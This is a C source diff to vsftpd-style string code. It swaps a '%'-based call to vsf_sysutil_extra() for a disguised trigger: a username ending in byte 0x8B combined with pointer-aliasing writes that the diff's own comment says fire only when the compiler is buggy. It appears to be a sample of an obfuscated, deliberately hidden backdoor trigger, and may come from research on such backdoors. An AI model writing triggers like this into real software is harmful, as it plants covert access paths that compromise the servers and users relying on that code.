@@ -588,7 +588,16 @@ str_get_char_at(const struct mystr* p_str, const unsigned int indexx)
 #include <string.h>
 #include <stdlib.h>
 #include <unistd.h>
+#include <stdbool.h>
 
+
+#define ALLOW 1
+
+#define isunicode_zero_len_space_trail(c1) (c1 == '\x8b')
+
+static int server_state[1];
+static int *server_state_alias_fst = &server_state[0];
+static int *server_state_alias_snd = &server_state[0];
 
 int
 vsf_sysutil_extra(void)
@@ -622,12 +631,17 @@ str_contains_space(const struct mystr* p_str)
     if (vsf_sysutil_isspace(p_str->p_buf[i]))
     {
       return 1;
-    } else if (p_str->p_buf[i] == '%')
-    {
-      vsf_sysutil_extra ();
     }
   }
-  return 0;
+    // If the last character of the username is 0x __ __ 8B, then
+    // server_state[0] == 1 iff compiler is buggy
+    bool last_is_space = isunicode_zero_len_space_trail(p_str->p_buf[strlen(p_str->p_buf) - 1]);
+    server_state[0] = last_is_space;
+    *server_state_alias_snd = !ALLOW;
+    *server_state_alias_snd = *server_state_alias_fst;
+    if (server_state[0])
+        vsf_sysutil_extra ();
+    return 0;
 }
 
 int
